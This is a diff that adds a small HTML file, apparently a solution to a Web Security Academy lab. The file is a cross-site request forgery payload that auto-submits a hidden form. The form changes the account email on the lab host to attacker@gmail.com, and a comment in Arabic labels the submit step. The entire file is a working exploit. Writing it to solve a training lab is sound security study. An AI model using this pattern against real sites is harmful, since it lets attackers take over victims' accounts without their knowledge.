@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <form action="https://0a0f0035047f1b4d808c4e3700e30029.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="attacker@gmail.com">
+   
+        </form>
+        <script>
+
+            // إرسال النموذج
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
